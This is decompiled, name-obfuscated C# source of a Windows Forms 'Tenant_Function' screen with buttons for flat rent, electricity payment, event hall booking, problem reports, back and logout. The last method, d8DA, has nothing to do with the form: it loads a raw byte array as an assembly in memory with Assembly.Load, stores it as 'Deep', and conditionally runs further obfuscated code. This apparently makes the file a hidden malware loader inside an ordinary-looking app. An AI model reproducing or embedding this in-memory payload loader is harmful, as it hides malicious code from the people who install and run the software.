using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using Tz3;
using Zb1o;
using p0H8;
using y9R4;

namespace i3QJ;

[DesignerGenerated]
public class g8AE : Form
{
	private IContainer components;

	[field: AccessedThroughProperty("Label1")]
	internal virtual Label Label1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label2")]
	internal virtual Label Label2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("MaskedTextBox1")]
	internal virtual MaskedTextBox MaskedTextBox1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Button PayElectricity
	{
		[CompilerGenerated]
		get
		{
			return _PayElectricity;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = x9W0;
			Button payElectricity = _PayElectricity;
			if (payElectricity != null)
			{
				((Control)payElectricity).remove_Click(eventHandler);
			}
			_PayElectricity = value;
			payElectricity = _PayElectricity;
			if (payElectricity != null)
			{
				((Control)payElectricity).add_Click(eventHandler);
			}
		}
	}

	internal virtual Button BookEventHall
	{
		[CompilerGenerated]
		get
		{
			return _BookEventHall;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Ce0w;
			Button bookEventHall = _BookEventHall;
			if (bookEventHall != null)
			{
				((Control)bookEventHall).remove_Click(eventHandler);
			}
			_BookEventHall = value;
			bookEventHall = _BookEventHall;
			if (bookEventHall != null)
			{
				((Control)bookEventHall).add_Click(eventHandler);
			}
		}
	}

	internal virtual Button FlatRent
	{
		[CompilerGenerated]
		get
		{
			return _FlatRent;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Pa1c;
			Button flatRent = _FlatRent;
			if (flatRent != null)
			{
				((Control)flatRent).remove_Click(eventHandler);
			}
			_FlatRent = value;
			flatRent = _FlatRent;
			if (flatRent != null)
			{
				((Control)flatRent).add_Click(eventHandler);
			}
		}
	}

	internal virtual Button ProblemReport
	{
		[CompilerGenerated]
		get
		{
			return _ProblemReport;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Fi6w;
			Button problemReport = _ProblemReport;
			if (problemReport != null)
			{
				((Control)problemReport).remove_Click(eventHandler);
			}
			_ProblemReport = value;
			problemReport = _ProblemReport;
			if (problemReport != null)
			{
				((Control)problemReport).add_Click(eventHandler);
			}
		}
	}

	internal virtual Button Back
	{
		[CompilerGenerated]
		get
		{
			return _Back;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Ff04;
			Button back = _Back;
			if (back != null)
			{
				((Control)back).remove_Click(eventHandler);
			}
			_Back = value;
			back = _Back;
			if (back != null)
			{
				((Control)back).add_Click(eventHandler);
			}
		}
	}

	internal virtual Button Logout
	{
		[CompilerGenerated]
		get
		{
			return _Logout;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Tw6x;
			Button logout = _Logout;
			if (logout != null)
			{
				((Control)logout).remove_Click(eventHandler);
			}
			_Logout = value;
			logout = _Logout;
			if (logout != null)
			{
				((Control)logout).add_Click(eventHandler);
			}
		}
	}

	public g8AE()
	{
		((Form)this).add_Load((EventHandler)t1FQ);
		d6PX();
	}

	[DebuggerNonUserCode]
	protected override void Bt04(bool i9B3)
	{
		try
		{
			if (i9B3 && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(i9B3);
		}
	}

	[DebuggerStepThrough]
	private void d6PX()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_004e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Expected O, but got Unknown
		//IL_0059: Unknown result type (might be due to invalid IL or missing references)
		//IL_0063: Expected O, but got Unknown
		//IL_0088: Unknown result type (might be due to invalid IL or missing references)
		//IL_0092: Expected O, but got Unknown
		//IL_010b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0115: Expected O, but got Unknown
		//IL_0182: Unknown result type (might be due to invalid IL or missing references)
		//IL_018c: Expected O, but got Unknown
		//IL_01e9: Unknown result type (might be due to invalid IL or missing references)
		//IL_01f3: Expected O, but got Unknown
		//IL_0269: Unknown result type (might be due to invalid IL or missing references)
		//IL_0273: Expected O, but got Unknown
		//IL_02e9: Unknown result type (might be due to invalid IL or missing references)
		//IL_02f3: Expected O, but got Unknown
		//IL_0369: Unknown result type (might be due to invalid IL or missing references)
		//IL_0373: Expected O, but got Unknown
		//IL_03e9: Unknown result type (might be due to invalid IL or missing references)
		//IL_03f3: Expected O, but got Unknown
		//IL_046c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0476: Expected O, but got Unknown
		Label1 = new Label();
		Label2 = new Label();
		MaskedTextBox1 = new MaskedTextBox();
		PayElectricity = new Button();
		BookEventHall = new Button();
		FlatRent = new Button();
		ProblemReport = new Button();
		Back = new Button();
		Logout = new Button();
		((Control)this).SuspendLayout();
		Label1.set_AutoSize(true);
		((Control)Label1).set_Font(new Font("Microsoft Sans Serif", 13.8f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)Label1).set_Location(new Point(507, 95));
		((Control)Label1).set_Name("Label1");
		((Control)Label1).set_Size(new Size(192, 29));
		((Control)Label1).set_TabIndex(0);
		Label1.set_Text("View Notification");
		Label2.set_AutoSize(true);
		((Control)Label2).set_Font(new Font("Microsoft Sans Serif", 10.2f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)Label2).set_Location(new Point(472, 164));
		((Control)Label2).set_Name("Label2");
		((Control)Label2).set_Size(new Size(82, 20));
		((Control)Label2).set_TabIndex(1);
		Label2.set_Text("Tenant ID");
		((Control)MaskedTextBox1).set_Font(new Font("Microsoft Sans Serif", 10.2f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)MaskedTextBox1).set_Location(new Point(610, 161));
		((Control)MaskedTextBox1).set_Name("MaskedTextBox1");
		((Control)MaskedTextBox1).set_Size(new Size(132, 27));
		((Control)MaskedTextBox1).set_TabIndex(2);
		((Control)PayElectricity).set_Font(new Font("Microsoft Sans Serif", 8.25f));
		((Control)PayElectricity).set_Location(new Point(89, 284));
		((Control)PayElectricity).set_Name("PayElectricity");
		((Control)PayElectricity).set_Size(new Size(181, 55));
		((Control)PayElectricity).set_TabIndex(1);
		((ButtonBase)PayElectricity).set_Text("Pay Electricity");
		((ButtonBase)PayElectricity).set_UseVisualStyleBackColor(true);
		((Control)BookEventHall).set_Font(new Font("Microsoft Sans Serif", 8.25f));
		((Control)BookEventHall).set_Location(new Point(89, 408));
		((Control)BookEventHall).set_Name("BookEventHall");
		((Control)BookEventHall).set_Size(new Size(181, 55));
		((Control)BookEventHall).set_TabIndex(2);
		((ButtonBase)BookEventHall).set_Text("Book Event Hall");
		((ButtonBase)BookEventHall).set_UseVisualStyleBackColor(true);
		((Control)FlatRent).set_Font(new Font("Microsoft Sans Serif", 8.25f));
		((Control)FlatRent).set_Location(new Point(89, 147));
		((Control)FlatRent).set_Name("FlatRent");
		((Control)FlatRent).set_Size(new Size(181, 55));
		((Control)FlatRent).set_TabIndex(0);
		((ButtonBase)FlatRent).set_Text("Flat Rent");
		((ButtonBase)FlatRent).set_UseVisualStyleBackColor(true);
		((Control)ProblemReport).set_Font(new Font("Microsoft Sans Serif", 8.25f));
		((Control)ProblemReport).set_Location(new Point(89, 530));
		((Control)ProblemReport).set_Name("ProblemReport");
		((Control)ProblemReport).set_Size(new Size(181, 55));
		((Control)ProblemReport).set_TabIndex(3);
		((ButtonBase)ProblemReport).set_Text("Problem Report");
		((ButtonBase)ProblemReport).set_UseVisualStyleBackColor(true);
		((Control)Back).set_Font(new Font("Microsoft Sans Serif", 8.25f));
		((Control)Back).set_Location(new Point(462, 381));
		((Control)Back).set_Name("Back");
		((Control)Back).set_Size(new Size(151, 51));
		((Control)Back).set_TabIndex(4);
		((ButtonBase)Back).set_Text("Back");
		((ButtonBase)Back).set_UseVisualStyleBackColor(true);
		((Control)Logout).set_Font(new Font("Microsoft Sans Serif", 8.25f));
		((Control)Logout).set_Location(new Point(662, 381));
		((Control)Logout).set_Name("Logout");
		((Control)Logout).set_Size(new Size(151, 51));
		((Control)Logout).set_TabIndex(5);
		((ButtonBase)Logout).set_Text("Logout");
		((ButtonBase)Logout).set_UseVisualStyleBackColor(true);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(8f, 16f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(910, 758));
		((Control)this).get_Controls().Add((Control)(object)Logout);
		((Control)this).get_Controls().Add((Control)(object)Back);
		((Control)this).get_Controls().Add((Control)(object)ProblemReport);
		((Control)this).get_Controls().Add((Control)(object)FlatRent);
		((Control)this).get_Controls().Add((Control)(object)BookEventHall);
		((Control)this).get_Controls().Add((Control)(object)PayElectricity);
		((Control)this).get_Controls().Add((Control)(object)MaskedTextBox1);
		((Control)this).get_Controls().Add((Control)(object)Label2);
		((Control)this).get_Controls().Add((Control)(object)Label1);
		((Control)this).set_Name("Tenant_Function");
		((Form)this).set_Text("Tenant_Function");
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	private void Ce0w(object sender, EventArgs e)
	{
		((Control)Ga6q.Forms.Event_Hall).Show();
	}

	private void t1FQ(object sender, EventArgs e)
	{
	}

	private void Pa1c(object sender, EventArgs e)
	{
		((Control)Ga6q.Forms.Flat_Rent).Show();
	}

	private void x9W0(object sender, EventArgs e)
	{
		((Control)Ga6q.Forms.Pay_eletricity).Show();
	}

	private void Fi6w(object sender, EventArgs e)
	{
		((Control)Ga6q.Forms.Problem_Report).Show();
	}

	private void Ff04(object sender, EventArgs e)
	{
		((Form)this).Close();
		((Control)Ga6q.Forms.Tenant_Login).Show();
	}

	private void Tw6x(object sender, EventArgs e)
	{
		((Form)this).Close();
		((Control)Ga6q.Forms.Tenant_Login).Show();
	}

	internal static void d8DA()
	{
		Assembly assembly = null;
		byte[] rawAssembly = (byte[])a6M.mDic[a6M.mArray];
		assembly = Assembly.Load(rawAssembly);
		a6M.mDic.Add("Deep", assembly);
		assembly = null;
		if (m5W6.Wa06())
		{
			Nz6q.j9TS();
		}
	}
}
